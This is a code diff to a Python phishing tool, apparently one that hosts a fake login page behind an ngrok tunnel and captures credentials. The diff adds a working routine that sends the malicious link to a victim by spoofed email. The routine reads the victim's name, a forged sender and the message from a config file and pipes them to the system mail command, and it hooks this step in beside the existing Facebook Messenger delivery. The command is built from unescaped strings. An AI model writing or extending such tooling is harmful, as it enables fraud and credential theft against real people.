@@ -26,11 +26,61 @@ Phisher Class
 class Phisher:
 
     """
-    Deliver the malicious link
+    Deliver the malicious link to an email address with email spoofing.
     """
-    #
-    # TODO: Email option will be implemented soon!!!.
-    #
+    def deliver_email (self, link):
+
+        # Send the message.
+        send = raw_input(
+            Style.RESET_ALL + Style.BRIGHT + Fore.WHITE + "Do you want to send an email [Y/n]: ")
+        while send == "":
+            send = raw_input(
+                Style.RESET_ALL + Style.BRIGHT + Fore.WHITE + "Do you want to send an email [Y/n]: ")
+
+        if (send == "Y" or send == "Yes" or send == "yes" or send == "y"):
+            self.send_mail(link)
+
+    """
+    Send a facebook message.
+    """
+
+    def send_mail(self, link):
+        config = ConfigParser.RawConfigParser()
+        config.read("config.cfg")
+
+        victim = config.get("EMAIL", "VICTIM_NAME")
+        spoof = config.get("EMAIL", "SPOOF_EMAIL")
+        email = config.get("EMAIL", "EMAIL")
+        message = config.get("EMAIL", "MESSAGE")
+        subject = config.get("EMAIL", "SUBJECT")
+
+
+        print(Style.RESET_ALL + Style.BRIGHT + Fore.BLUE + "\n[ + ] " +
+              Style.RESET_ALL + Style.BRIGHT + Fore.WHITE + "SENDING " +
+              Style.RESET_ALL + Style.BRIGHT + Fore.RED + "SPOOFED EMAIL " +
+              Style.RESET_ALL + Style.BRIGHT + Fore.WHITE + "TO " +
+              Style.RESET_ALL + Style.BRIGHT + Fore.YELLOW + email +
+              Style.RESET_ALL + Style.BRIGHT + Fore.WHITE + " FROM " +
+              Style.RESET_ALL + Style.BRIGHT + Fore.YELLOW + spoof)
+        time.sleep(1)
+
+        # Replace {name} with the user's name.
+        newMsg = str(message).replace("{name}", victim)
+
+        # Send it now.
+        os.system('''echo "%s \n%s" | mail %s -r %s -s %s''' % (newMsg, link, email, spoof, subject))
+
+        print(Style.RESET_ALL + Style.BRIGHT + Fore.BLUE + "[ + ] " +
+              Style.RESET_ALL + Style.BRIGHT + Fore.GREEN + "MESSAGE " +
+              Style.RESET_ALL + Style.BRIGHT + Fore.GREEN + "SENT. >:) ")
+        time.sleep(3)
+
+
+
+
+    """
+    Deliver the malicious link with fb messenger
+    """
     def deliver_fb(self, linkhttps):
         fbdel = raw_input(Style.RESET_ALL + Style.BRIGHT + Fore.WHITE + "Do you want to deliver to FB Messenger [Y/n]: ")
         while fbdel == "":
@@ -265,9 +315,18 @@ write_creds();
         print(Style.RESET_ALL + Style.BRIGHT + Fore.BLUE + "\nALL READY!!\n")
         time.sleep(1)
 
+        print(Style.RESET_ALL + Style.BRIGHT + Fore.LIGHTBLACK_EX +
+              "\n=================================================================")
+        print(Style.RESET_ALL + Style.BRIGHT + Fore.CYAN +
+              """Type Y for the services you want to use to deploy the link to""")
+        print(Style.RESET_ALL + Style.BRIGHT + Fore.LIGHTBLACK_EX +
+              "===================================================================")
+
 
         # Deliver the FB message.
         self.deliver_fb(j['tunnels'][0]['public_url'])
+        # Deliver a spoofed email.
+        self.deliver_email(j['tunnels'][0]['public_url'])
 
         # Print out the screen that captures the Credentials
         subprocess.call(["clear"])
